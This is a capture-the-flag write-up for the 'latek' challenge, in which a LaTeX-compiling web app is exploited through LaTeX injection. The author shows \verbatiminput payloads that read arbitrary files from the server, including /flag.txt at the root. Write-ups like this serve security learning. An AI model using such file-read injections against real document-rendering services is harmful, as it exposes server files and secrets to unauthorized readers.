# latek

> bryanguo (not associated with the ctf), keeps saying it's pronouced latek not latex like the glove material. anyways i made this simple app so he stops paying for overleaf.
> https://latek.amt.rs

I first tried https://latek.amt.rs/document/flag.txt and got

```
foo 1
foo 2
\textbf{foo 3}
```

Like what???? I tried putting that into the website but nothing showed up

There is this: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection (beeg boy found this)

So we can read files in LaTeX:
```tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{flag.txt}
\end{document}
```

Which gives us this again:

```
foo 1
foo 2
\textbf{foo 3}
```
I was a bit stumped.

Anyways one day I added a `/` in front of the `flag.txt` and checked for it in root:
```tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/flag.txt}
\end{document}
```

And I got the flag: `amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}`

Somehow the biggest roadbock was discovering that it was in root. Oh well whatever
